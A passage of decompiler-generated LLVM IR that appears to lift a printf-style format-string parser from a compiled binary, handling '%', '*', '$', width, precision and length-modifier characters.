dec_label_pc_1000c4c0.dec_label_pc_1000c490_crit_edge: ; preds = %dec_label_pc_1000c4c0
  %v0_1000c490.pre = load i32, i32* @r10, align 4
  %v0_1000c494.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000c498.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000c490

dec_label_pc_1000c4c4:                            ; preds = %dec_label_pc_1000c4c0, %dec_label_pc_1000c4bc
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000c4c8 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000c4d0

dec_label_pc_1000c4d0:                            ; preds = %dec_label_pc_1000c464, %dec_label_pc_1000c4c4
  %v2_1000c4e0.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000c464 ], [ %v2_1000c48c, %dec_label_pc_1000c4c4 ]
  %storemerge3 = phi i32 [ %v2_1000c464, %dec_label_pc_1000c464 ], [ %v2_1000c4c8, %dec_label_pc_1000c4c4 ]
  store i32 %storemerge3, i32* @r10, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268566528, i32* @r27, align 4
  store i32 %v2_1000c4e0.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000c4f0

dec_label_pc_1000c4ec:                            ; preds = %dec_label_pc_1000c5fc, %dec_label_pc_1000c680
  %v0_1000c4ec = phi i32 [ %v1_1000c680, %dec_label_pc_1000c680 ], [ %v0_1000c5e4, %dec_label_pc_1000c5fc ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000c680 ], [ %stack_var_-84.2, %dec_label_pc_1000c5fc ]
  store i32 %v0_1000c4ec, i32* @r10, align 4
  br label %dec_label_pc_1000c4f0

dec_label_pc_1000c4f0:                            ; preds = %dec_label_pc_1000c4d0, %dec_label_pc_1000c4ec
  %v0_1000c504 = phi i32 [ %storemerge3, %dec_label_pc_1000c4d0 ], [ %v0_1000c4ec, %dec_label_pc_1000c4ec ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000c4d0 ], [ %stack_var_-84.0, %dec_label_pc_1000c4ec ]
  %v1_1000c4f0 = inttoptr i32 %v0_1000c504 to i8*
  %v2_1000c4f0 = load i8, i8* %v1_1000c4f0, align 1
  %v3_1000c4f0 = zext i8 %v2_1000c4f0 to i32
  store i32 %v3_1000c4f0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c504, i32* @r30, align 4
  %v3_1000c4f8 = icmp eq i8 %v2_1000c4f0, 42
  br i1 %v3_1000c4f8, label %dec_label_pc_1000c500, label %dec_label_pc_1000c510

dec_label_pc_1000c500:                            ; preds = %dec_label_pc_1000c4f0
  %v0_1000c500 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c500 = mul i32 %v0_1000c500, -4
  store i32 %v1_1000c500, i32* %r0.global-to-local, align 4
  %v1_1000c504 = add i32 %v0_1000c504, 1
  store i32 %v1_1000c504, i32* @r30, align 4
  %v0_1000c508 = load i32, i32* @r1, align 4
  %v2_1000c508 = add i32 %v0_1000c508, %v1_1000c500
  store i32 %v2_1000c508, i32* %r9.global-to-local, align 4
  %v0_1000c50c = load i32, i32* @r29, align 4
  %v2_1000c50c = add i32 %v2_1000c508, 8
  %v3_1000c50c = inttoptr i32 %v2_1000c50c to i32*
  store i32 %v0_1000c50c, i32* %v3_1000c50c, align 4
  %v0_1000c528.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c510

dec_label_pc_1000c510:                            ; preds = %dec_label_pc_1000c4f0, %dec_label_pc_1000c500
  %v0_1000c528.pre = phi i32 [ %v0_1000c504, %dec_label_pc_1000c4f0 ], [ %v0_1000c528.pre.pre, %dec_label_pc_1000c500 ]
  %v0_1000c510 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c510 = add i32 %v0_1000c510, -4180
  %v2_1000c510 = inttoptr i32 %v1_1000c510 to i32*
  %v3_1000c510 = load i32, i32* %v2_1000c510, align 4
  store i32 %v3_1000c510, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1000c528

dec_label_pc_1000c51c:                            ; preds = %dec_label_pc_1000c528
  %v2_1000c52c = icmp sgt i32 %v0_1000c574, 4094
  br i1 %v2_1000c52c, label %dec_label_pc_1000c524, label %dec_label_pc_1000c520

dec_label_pc_1000c520:                            ; preds = %dec_label_pc_1000c51c
  %v1_1000c520 = add i32 %v2_1000c540, -48
  store i32 %v1_1000c520, i32* @r8, align 4
  br label %dec_label_pc_1000c524

dec_label_pc_1000c524:                            ; preds = %dec_label_pc_1000c51c, %dec_label_pc_1000c520
  %v0_1000c52c15 = phi i32 [ %v0_1000c574, %dec_label_pc_1000c51c ], [ %v1_1000c520, %dec_label_pc_1000c520 ]
  %v1_1000c524 = add i32 %v0_1000c5a4, 1
  store i32 %v1_1000c524, i32* @r30, align 4
  br label %dec_label_pc_1000c528

dec_label_pc_1000c528:                            ; preds = %dec_label_pc_1000c510, %dec_label_pc_1000c524
  %v0_1000c574 = phi i32 [ 0, %dec_label_pc_1000c510 ], [ %v0_1000c52c15, %dec_label_pc_1000c524 ]
  %v0_1000c5a4 = phi i32 [ %v0_1000c528.pre, %dec_label_pc_1000c510 ], [ %v1_1000c524, %dec_label_pc_1000c524 ]
  %v1_1000c528 = inttoptr i32 %v0_1000c5a4 to i8*
  %v2_1000c528 = load i8, i8* %v1_1000c528, align 1
  %v3_1000c528 = zext i8 %v2_1000c528 to i32
  store i32 %v3_1000c528, i32* %r11.global-to-local, align 4
  %v1_1000c530 = mul nuw nsw i32 %v3_1000c528, 2
  store i32 %v1_1000c530, i32* %r9.global-to-local, align 4
  %v2_1000c534 = add i32 %v1_1000c530, %v3_1000c510
  %v3_1000c534 = inttoptr i32 %v2_1000c534 to i16*
  %v4_1000c534 = load i16, i16* %v3_1000c534, align 2
  %v5_1000c534 = zext i16 %v4_1000c534 to i32
  store i32 %v5_1000c534, i32* %r0.global-to-local, align 4
  %v1_1000c538 = mul i32 %v0_1000c574, 10
  %v1_1000c53c = and i32 %v5_1000c534, 8
  store i32 %v1_1000c53c, i32* @r25, align 4
  %v3_1000c53c = icmp eq i32 %v1_1000c53c, 0
  %v2_1000c540 = add i32 %v3_1000c528, %v1_1000c538
  store i32 %v2_1000c540, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c53c, label %dec_label_pc_1000c548, label %dec_label_pc_1000c51c

dec_label_pc_1000c548:                            ; preds = %dec_label_pc_1000c528
  %v0_1000c548 = load i32, i32* @r10, align 4
  %v1_1000c548 = add i32 %v0_1000c548, -1
  %v2_1000c548 = inttoptr i32 %v1_1000c548 to i8*
  %v3_1000c548 = load i8, i8* %v2_1000c548, align 1
  %v4_1000c548 = zext i8 %v3_1000c548 to i32
  store i32 %v4_1000c548, i32* %r0.global-to-local, align 4
  %v3_1000c54c = icmp eq i8 %v3_1000c548, 37
  br i1 %v3_1000c54c, label %dec_label_pc_1000c554, label %dec_label_pc_1000c61c

dec_label_pc_1000c554:                            ; preds = %dec_label_pc_1000c548
  %v3_1000c554 = icmp eq i8 %v2_1000c528, 36
  br i1 %v3_1000c554, label %dec_label_pc_1000c55c, label %dec_label_pc_1000c590

dec_label_pc_1000c55c:                            ; preds = %dec_label_pc_1000c554
  %tmp58 = icmp slt i32 %v0_1000c574, 1
  br i1 %tmp58, label %dec_label_pc_1000c590, label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %dec_label_pc_1000c55c
  %v0_1000c564 = load i32, i32* @r26, align 4
  %v3_1000c564 = icmp eq i32 %v0_1000c564, 0
  %v1_1000c568 = add i32 %v0_1000c5a4, 1
  store i32 %v1_1000c568, i32* @r10, align 4
  br i1 %v3_1000c564, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c570

dec_label_pc_1000c570:                            ; preds = %dec_label_pc_1000c564
  %v3_1000c570 = icmp sgt i32 %v0_1000c574, %v0_1000c564
  br i1 %v3_1000c570, label %dec_label_pc_1000c57c, label %dec_label_pc_1000c588

dec_label_pc_1000c57c:                            ; preds = %dec_label_pc_1000c570
  store i32 %v0_1000c574, i32* @r26, align 4
  br label %dec_label_pc_1000c588

dec_label_pc_1000c584:                            ; preds = %dec_label_pc_1000c5ac, %dec_label_pc_1000c5a4
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000c588

dec_label_pc_1000c588:                            ; preds = %dec_label_pc_1000c570, %dec_label_pc_1000c57c, %dec_label_pc_1000c584
  %v0_1000c588 = phi i32 [ %v0_1000c548, %dec_label_pc_1000c584 ], [ %v1_1000c568, %dec_label_pc_1000c57c ], [ %v1_1000c568, %dec_label_pc_1000c570 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000c584 ], [ %v0_1000c574, %dec_label_pc_1000c57c ], [ %v0_1000c574, %dec_label_pc_1000c570 ]
  br label %dec_label_pc_1000c5c4

dec_label_pc_1000c590:                            ; preds = %dec_label_pc_1000c554, %dec_label_pc_1000c55c
  %v0_1000c590 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000c590, 1
  br i1 %tmp59, label %dec_label_pc_1000c5a4, label %dec_label_pc_1000c598

dec_label_pc_1000c598:                            ; preds = %dec_label_pc_1000c590
  %v3_1000c598 = icmp eq i8 %v2_1000c528, 109
  br i1 %v3_1000c598, label %dec_label_pc_1000c61c, label %dec_label_pc_1000c92c

dec_label_pc_1000c5a4:                            ; preds = %dec_label_pc_1000c590
  %v3_1000c5a4 = icmp ugt i32 %v0_1000c5a4, %v0_1000c548
  br i1 %v3_1000c5a4, label %dec_label_pc_1000c5ac, label %dec_label_pc_1000c584

dec_label_pc_1000c5ac:                            ; preds = %dec_label_pc_1000c5a4
  %v1_1000c5ac = inttoptr i32 %v0_1000c548 to i8*
  %v2_1000c5ac = load i8, i8* %v1_1000c5ac, align 1
  %v3_1000c5ac = zext i8 %v2_1000c5ac to i32
  store i32 %v3_1000c5ac, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c548, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000c5b8 = icmp eq i8 %v2_1000c5ac, 48
  br i1 %v3_1000c5b8, label %dec_label_pc_1000c584, label %dec_label_pc_1000c620

dec_label_pc_1000c5c4:                            ; preds = %dec_label_pc_1000c5e0, %dec_label_pc_1000c588
  %v0_1000c5e4 = phi i32 [ %v0_1000c588, %dec_label_pc_1000c588 ], [ %v1_1000c5e4, %dec_label_pc_1000c5e0 ]
  store i32 %v0_1000c5e4, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10018d14.404 to i32), i32* %r11.global-to-local, align 4
  %v1_1000c5d4 = inttoptr i32 %v0_1000c5e4 to i8*
  br label %dec_label_pc_1000c5cc

dec_label_pc_1000c5cc:                            ; preds = %dec_label_pc_1000c5ec, %dec_label_pc_1000c5c4
  %v1_1000c5e0 = phi i32 [ %v1_1000c5f0, %dec_label_pc_1000c5ec ], [ 1, %dec_label_pc_1000c5c4 ]
  %v0_1000c5cc = phi i32 [ %v1_1000c5d0, %dec_label_pc_1000c5ec ], [ ptrtoint ([8 x i8]* @global_var_10018d14.404 to i32), %dec_label_pc_1000c5c4 ]
  %v1_1000c5cc = inttoptr i32 %v0_1000c5cc to i8*
  %v2_1000c5cc = load i8, i8* %v1_1000c5cc, align 1
  %v3_1000c5cc = zext i8 %v2_1000c5cc to i32
  store i32 %v3_1000c5cc, i32* %r9.global-to-local, align 4
  %v1_1000c5d0 = add i32 %v0_1000c5cc, 1
  store i32 %v1_1000c5d0, i32* %r11.global-to-local, align 4
  %v2_1000c5d4 = load i8, i8* %v1_1000c5d4, align 1
  %v3_1000c5d4 = zext i8 %v2_1000c5d4 to i32
  store i32 %v3_1000c5d4, i32* %r0.global-to-local, align 4
  %v4_1000c5d8 = icmp eq i8 %v2_1000c5d4, %v2_1000c5cc
  br i1 %v4_1000c5d8, label %dec_label_pc_1000c5e0, label %dec_label_pc_1000c5ec

dec_label_pc_1000c5e0:                            ; preds = %dec_label_pc_1000c5cc
  %v0_1000c5e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000c5e0 = or i32 %v0_1000c5e0, %v1_1000c5e0
  store i32 %v2_1000c5e0, i32* %r6.global-to-local, align 4
  %v1_1000c5e4 = add i32 %v0_1000c5e4, 1
  br label %dec_label_pc_1000c5c4

dec_label_pc_1000c5ec:                            ; preds = %dec_label_pc_1000c5cc
  %v1_1000c5ec = inttoptr i32 %v1_1000c5d0 to i8*
  %v2_1000c5ec = load i8, i8* %v1_1000c5ec, align 1
  %v3_1000c5ec = zext i8 %v2_1000c5ec to i32
  store i32 %v3_1000c5ec, i32* %r0.global-to-local, align 4
  %v1_1000c5f0 = mul i32 %v1_1000c5e0, 2
  store i32 %v1_1000c5f0, i32* @r10, align 4
  %v3_1000c5f4 = icmp eq i8 %v2_1000c5ec, 0
  br i1 %v3_1000c5f4, label %dec_label_pc_1000c5fc, label %dec_label_pc_1000c5cc

dec_label_pc_1000c5fc:                            ; preds = %dec_label_pc_1000c5ec
  %v1_1000c5fc = add i32 %v0_1000c5e4, -1
  %v2_1000c5fc = inttoptr i32 %v1_1000c5fc to i8*
  %v3_1000c5fc = load i8, i8* %v2_1000c5fc, align 1
  %v4_1000c5fc = zext i8 %v3_1000c5fc to i32
  store i32 %v4_1000c5fc, i32* %r0.global-to-local, align 4
  %v0_1000c600 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c600 = and i32 %v0_1000c600, 10
  store i32 0, i32* @r8, align 4
  %v3_1000c608 = icmp eq i8 %v3_1000c5fc, 37
  %v1_1000c60c = udiv i32 %v1_1000c600, 2
  store i32 %v1_1000c60c, i32* %r9.global-to-local, align 4
  %v2_1000c610 = sub nuw nsw i32 -1, %v1_1000c60c
  %v3_1000c610 = and i32 %v0_1000c600, %v2_1000c610
  store i32 %v3_1000c610, i32* %r6.global-to-local, align 4
  br i1 %v3_1000c608, label %dec_label_pc_1000c620, label %dec_label_pc_1000c4ec

dec_label_pc_1000c61c:                            ; preds = %dec_label_pc_1000c548, %dec_label_pc_1000c598
  store i32 %v0_1000c548, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c620

dec_label_pc_1000c620:                            ; preds = %dec_label_pc_1000c5ac, %dec_label_pc_1000c5fc, %dec_label_pc_1000c61c
  %v0_1000c654 = phi i32 [ 0, %dec_label_pc_1000c5fc ], [ %v0_1000c574, %dec_label_pc_1000c5ac ], [ %v0_1000c574, %dec_label_pc_1000c61c ]
  %v1_1000c660 = phi i32 [ %v0_1000c5e4, %dec_label_pc_1000c5fc ], [ %v0_1000c5a4, %dec_label_pc_1000c5ac ], [ %v0_1000c5a4, %dec_label_pc_1000c61c ]
  %v0_1000c65c = phi i32 [ %v1_1000c5d0, %dec_label_pc_1000c5fc ], [ %v0_1000c548, %dec_label_pc_1000c5ac ], [ %v0_1000c548, %dec_label_pc_1000c61c ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000c5fc ], [ %stack_var_-84.1, %dec_label_pc_1000c5ac ], [ %stack_var_-84.1, %dec_label_pc_1000c61c ]
  %v1_1000c620 = inttoptr i32 %v0_1000c65c to i8*
  %v2_1000c620 = load i8, i8* %v1_1000c620, align 1
  %v3_1000c620 = zext i8 %v2_1000c620 to i32
  store i32 %v3_1000c620, i32* %r0.global-to-local, align 4
  %v3_1000c624 = icmp eq i8 %v2_1000c620, 42
  br i1 %v3_1000c624, label %dec_label_pc_1000c62c, label %dec_label_pc_1000c66c

dec_label_pc_1000c62c:                            ; preds = %dec_label_pc_1000c620
  %v0_1000c62c = load i32, i32* @r26, align 4
  %v3_1000c62c = icmp eq i32 %v0_1000c62c, 0
  br i1 %v3_1000c62c, label %dec_label_pc_1000c65c, label %dec_label_pc_1000c634

dec_label_pc_1000c634:                            ; preds = %dec_label_pc_1000c62c
  %v1_1000c634 = inttoptr i32 %v1_1000c660 to i8*
  %v2_1000c634 = load i8, i8* %v1_1000c634, align 1
  %v3_1000c634 = zext i8 %v2_1000c634 to i32
  store i32 %v3_1000c634, i32* %r0.global-to-local, align 4
  %v3_1000c638 = icmp eq i8 %v2_1000c634, 36
  br i1 %v3_1000c638, label %dec_label_pc_1000c640, label %dec_label_pc_1000c92c

dec_label_pc_1000c640:                            ; preds = %dec_label_pc_1000c634
  %tmp60 = icmp slt i32 %v0_1000c654, 1
  br i1 %tmp60, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c648

dec_label_pc_1000c648:                            ; preds = %dec_label_pc_1000c640
  %v0_1000c648 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c648 = mul i32 %v0_1000c648, -4
  %v1_1000c64c = add i32 %v1_1000c660, 1
  store i32 %v1_1000c64c, i32* @r30, align 4
  %v0_1000c650 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000c650 = add i32 %v0_1000c650, %v1_1000c648
  store i32 %v2_1000c650, i32* %r9.global-to-local, align 4
  %v2_1000c654 = add i32 %v2_1000c650, 12
  %v3_1000c654 = inttoptr i32 %v2_1000c654 to i32*
  store i32 %v0_1000c654, i32* %v3_1000c654, align 4
  %v0_1000c674.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c668

dec_label_pc_1000c65c:                            ; preds = %dec_label_pc_1000c62c
  %v1_1000c65c = add i32 %v0_1000c65c, 1
  store i32 %v1_1000c65c, i32* %r0.global-to-local, align 4
  %v4_1000c660 = icmp eq i32 %v1_1000c65c, %v1_1000c660
  br i1 %v4_1000c660, label %dec_label_pc_1000c668, label %dec_label_pc_1000c92c

dec_label_pc_1000c668:                            ; preds = %dec_label_pc_1000c65c, %dec_label_pc_1000c648
  %v0_1000c674.pre = phi i32 [ %v1_1000c660, %dec_label_pc_1000c65c ], [ %v0_1000c674.pre.pre, %dec_label_pc_1000c648 ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000c66c

dec_label_pc_1000c66c:                            ; preds = %dec_label_pc_1000c620, %dec_label_pc_1000c668
  %v0_1000c674 = phi i32 [ %v1_1000c660, %dec_label_pc_1000c620 ], [ %v0_1000c674.pre, %dec_label_pc_1000c668 ]
  %v0_1000c684 = phi i32 [ %v0_1000c654, %dec_label_pc_1000c620 ], [ -2147483648, %dec_label_pc_1000c668 ]
  %v0_1000c66c = load i32, i32* %r5.global-to-local, align 4
  %v3_1000c66c = icmp eq i32 %v0_1000c66c, 0
  %v1_1000c674 = inttoptr i32 %v0_1000c674 to i8*
  br i1 %v3_1000c66c, label %dec_label_pc_1000c674, label %dec_label_pc_1000c698

dec_label_pc_1000c674:                            ; preds = %dec_label_pc_1000c66c
  %v2_1000c674 = load i8, i8* %v1_1000c674, align 1
  %v3_1000c674 = zext i8 %v2_1000c674 to i32
  store i32 %v3_1000c674, i32* %r0.global-to-local, align 4
  %v3_1000c678 = icmp eq i8 %v2_1000c674, 46
  br i1 %v3_1000c678, label %dec_label_pc_1000c680, label %dec_label_pc_1000c690

dec_label_pc_1000c680:                            ; preds = %dec_label_pc_1000c674
  %v1_1000c680 = add i32 %v0_1000c674, 1
  store i32 %v0_1000c684, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c4ec

dec_label_pc_1000c690:                            ; preds = %dec_label_pc_1000c674
  store i32 %v0_1000c684, i32* @r31, align 4
  br label %dec_label_pc_1000c698

dec_label_pc_1000c698:                            ; preds = %dec_label_pc_1000c66c, %dec_label_pc_1000c690
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000c690 ], [ %v0_1000c684, %dec_label_pc_1000c66c ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_1000c69c = load i8, i8* %v1_1000c674, align 1
  store i32 ptrtoint ([9 x i8]* @global_var_10018cbc.405 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c6a4

dec_label_pc_1000c6a4:                            ; preds = %dec_label_pc_1000c6b0, %dec_label_pc_1000c698
  %v0_1000c6b0 = phi i32 [ %v1_1000c6b0, %dec_label_pc_1000c6b0 ], [ ptrtoint ([9 x i8]* @global_var_10018cbc.405 to i32), %dec_label_pc_1000c698 ]
  %v1_1000c6a4 = inttoptr i32 %v0_1000c6b0 to i8*
  %v2_1000c6a4 = load i8, i8* %v1_1000c6a4, align 1
  %v3_1000c6a4 = zext i8 %v2_1000c6a4 to i32
  store i32 %v3_1000c6a4, i32* %r0.global-to-local, align 4
  %v4_1000c6a8 = icmp eq i8 %v2_1000c69c, %v2_1000c6a4
  br i1 %v4_1000c6a8, label %dec_label_pc_1000c474, label %dec_label_pc_1000c6b0

dec_label_pc_1000c6b0:                            ; preds = %dec_label_pc_1000c6a4
  %v1_1000c6b0 = add i32 %v0_1000c6b0, 1
  %v2_1000c6b0 = inttoptr i32 %v1_1000c6b0 to i8*
  %v3_1000c6b0 = load i8, i8* %v2_1000c6b0, align 1
  %v4_1000c6b0 = zext i8 %v3_1000c6b0 to i32
  store i32 %v4_1000c6b0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c6b0, i32* %r11.global-to-local, align 4
  %v3_1000c6b4 = icmp eq i8 %v3_1000c6b0, 0
  br i1 %v3_1000c6b4, label %dec_label_pc_1000c6bc, label %dec_label_pc_1000c6a4

dec_label_pc_1000c6bc:                            ; preds = %dec_label_pc_1000c6b0, %dec_label_pc_1000c474
  %v0_1000c6e4 = phi i32 [ %v1_1000c474, %dec_label_pc_1000c474 ], [ %v0_1000c674, %dec_label_pc_1000c6b0 ]
  %v0_1000c6e0 = phi i32 [ %v0_1000c6b0, %dec_label_pc_1000c474 ], [ %v1_1000c6b0, %dec_label_pc_1000c6b0 ]
  %v2_1000c6c4 = sub i32 %v0_1000c6e0, ptrtoint ([9 x i8]* @global_var_10018cbc.405 to i32)
  store i32 %v2_1000c6c4, i32* %r9.global-to-local, align 4
  %v2_1000c6c8 = icmp sgt i32 %v2_1000c6c4, 1
  br i1 %v2_1000c6c8, label %dec_label_pc_1000c6e8, label %dec_label_pc_1000c6d0

dec_label_pc_1000c6d0:                            ; preds = %dec_label_pc_1000c6bc
  %v1_1000c6d0 = inttoptr i32 %v0_1000c6e4 to i8*
  %v2_1000c6d0 = load i8, i8* %v1_1000c6d0, align 1
  %v3_1000c6d0 = zext i8 %v2_1000c6d0 to i32
  store i32 %v3_1000c6d0, i32* %r0.global-to-local, align 4
  %v1_1000c6d4 = inttoptr i32 %v0_1000c6e0 to i8*
  %v2_1000c6d4 = load i8, i8* %v1_1000c6d4, align 1
  %v3_1000c6d4 = zext i8 %v2_1000c6d4 to i32
  store i32 %v3_1000c6d4, i32* %r9.global-to-local, align 4
  %v4_1000c6d8 = icmp eq i8 %v2_1000c6d0, %v2_1000c6d4
  br i1 %v4_1000c6d8, label %dec_label_pc_1000c6e0, label %dec_label_pc_1000c6e8

dec_label_pc_1000c6e0:                            ; preds = %dec_label_pc_1000c6d0
  %v1_1000c6e0 = add i32 %v0_1000c6e0, 9
  store i32 %v1_1000c6e0, i32* %r11.global-to-local, align 4
  %v1_1000c6e4 = add i32 %v0_1000c6e4, 1
  store i32 %v1_1000c6e4, i32* @r30, align 4
  br label %dec_label_pc_1000c6e8

dec_label_pc_1000c6e8:                            ; preds = %dec_label_pc_1000c6d0, %dec_label_pc_1000c6bc, %dec_label_pc_1000c6e0
  %v0_1000c6ec = phi i32 [ %v0_1000c6e0, %dec_label_pc_1000c6d0 ], [ %v0_1000c6e0, %dec_label_pc_1000c6bc ], [ %v1_1000c6e0, %dec_label_pc_1000c6e0 ]
  %v0_1000c6e8 = phi i32 [ %v0_1000c6e4, %dec_label_pc_1000c6d0 ], [ %v0_1000c6e4, %dec_label_pc_1000c6bc ], [ %v1_1000c6e4, %dec_label_pc_1000c6e0 ]
  %v1_1000c6e8 = inttoptr i32 %v0_1000c6e8 to i8*
  %v2_1000c6e8 = load i8, i8* %v1_1000c6e8, align 1
  %v3_1000c6e8 = zext i8 %v2_1000c6e8 to i32
  store i32 %v3_1000c6e8, i32* %r7.global-to-local, align 4
  %v1_1000c6ec = add i32 %v0_1000c6ec, 9
  %v2_1000c6ec = inttoptr i32 %v1_1000c6ec to i8*
  %v3_1000c6ec = load i8, i8* %v2_1000c6ec, align 1
  %v4_1000c6ec = zext i8 %v3_1000c6ec to i32
  store i32 %v4_1000c6ec, i32* %r0.global-to-local, align 4
  %v3_1000c6f0 = icmp eq i8 %v2_1000c6e8, 0
  %v1_1000c6f4 = mul nuw nsw i32 %v4_1000c6ec, 256
  store i32 %v1_1000c6f4, i32* @r10, align 4
  br i1 %v3_1000c6f0, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c6fc

dec_label_pc_1000c6fc:                            ; preds = %dec_label_pc_1000c6e8
  %v1_1000c700 = and i32 %v1_1000c6f4, 1024
  store i32 %v1_1000c700, i32* %r0.global-to-local, align 4
  %v3_1000c700 = icmp eq i32 %v1_1000c700, 0
  store i32 268566528, i32* %r3.global-to-local, align 4
  %v3_1000c70c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000c70c, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10018cf0.407 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10018cfc.406 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c71c

dec_label_pc_1000c71c:                            ; preds = %dec_label_pc_1000c780, %dec_label_pc_1000c6fc
  %v1_1000c728 = phi i32 [ %v1_1000c780, %dec_label_pc_1000c780 ], [ ptrtoint ([21 x i8]* @global_var_10018cfc.406 to i32), %dec_label_pc_1000c6fc ]
  %v1_1000c71c = inttoptr i32 %v1_1000c728 to i8*
  %v2_1000c71c = load i8, i8* %v1_1000c71c, align 1
  %v3_1000c71c = zext i8 %v2_1000c71c to i32
  store i32 %v3_1000c71c, i32* %r0.global-to-local, align 4
  %v4_1000c720 = icmp eq i8 %v2_1000c71c, %v2_1000c6e8
  br i1 %v4_1000c720, label %dec_label_pc_1000c728, label %dec_label_pc_1000c780

dec_label_pc_1000c728:                            ; preds = %dec_label_pc_1000c71c
  %v2_1000c728 = sub i32 %v1_1000c728, ptrtoint ([21 x i8]* @global_var_10018cfc.406 to i32)
  %tmp61 = icmp slt i32 %v2_1000c728, 18
  %brmerge = or i1 %v3_1000c700, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000c73c, label %dec_label_pc_1000c738

dec_label_pc_1000c738:                            ; preds = %dec_label_pc_1000c728
  %v1_1000c738 = add i32 %v2_1000c728, -2
  br label %dec_label_pc_1000c73c

dec_label_pc_1000c73c:                            ; preds = %dec_label_pc_1000c728, %dec_label_pc_1000c738
  %storemerge = phi i32 [ %v1_1000c738, %dec_label_pc_1000c738 ], [ %v2_1000c728, %dec_label_pc_1000c728 ]
  %v0_1000c73c = phi i32 [ %v1_1000c738, %dec_label_pc_1000c738 ], [ %v2_1000c728, %dec_label_pc_1000c728 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000c73c = load i32, i32* @r28, align 4
  %v2_1000c73c = add i32 %v1_1000c73c, 32
  %v3_1000c73c = inttoptr i32 %v2_1000c73c to i32*
  store i32 %v0_1000c73c, i32* %v3_1000c73c, align 4
  store i32 ptrtoint (i32* @global_var_10018cef.408 to i32), i32* %r11.global-to-local, align 4
  %v0_1000c748.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c744

dec_label_pc_1000c744:                            ; preds = %dec_label_pc_1000c744, %dec_label_pc_1000c73c
  %v0_1000c744 = phi i32 [ %v1_1000c744, %dec_label_pc_1000c744 ], [ ptrtoint (i32* @global_var_10018cef.408 to i32), %dec_label_pc_1000c73c ]
  %v1_1000c744 = add i32 %v0_1000c744, 1
  %v2_1000c744 = inttoptr i32 %v1_1000c744 to i8*
  %v3_1000c744 = load i8, i8* %v2_1000c744, align 1
  %v4_1000c744 = zext i8 %v3_1000c744 to i32
  store i32 %v4_1000c744, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c744, i32* %r11.global-to-local, align 4
  %v3_1000c748 = icmp sgt i32 %v0_1000c748.pre, %v4_1000c744
  br i1 %v3_1000c748, label %dec_label_pc_1000c744, label %dec_label_pc_1000c750

dec_label_pc_1000c750:                            ; preds = %dec_label_pc_1000c744
  %v0_1000c750 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000c750 = sub i32 %v1_1000c744, %v0_1000c750
  %v1_1000c758 = mul i32 %v2_1000c750, 2
  store i32 %v1_1000c758, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10018ce0.409 to i32), i32* %r9.global-to-local, align 4
  %v2_1000c760 = add i32 %v1_1000c758, ptrtoint (i32* @global_var_10018ce0.409 to i32)
  %v3_1000c760 = inttoptr i32 %v2_1000c760 to i16*
  %v4_1000c760 = load i16, i16* %v3_1000c760, align 2
  %v5_1000c760 = sext i16 %v4_1000c760 to i32
  store i32 %v5_1000c760, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10018cd0.410 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10018cfc.406 to i32), i32* @r8, align 4
  %v2_1000c770 = add i32 %v1_1000c758, ptrtoint (i32* @global_var_10018cd0.410 to i32)
  %v3_1000c770 = inttoptr i32 %v2_1000c770 to i16*
  %v4_1000c770 = load i16, i16* %v3_1000c770, align 2
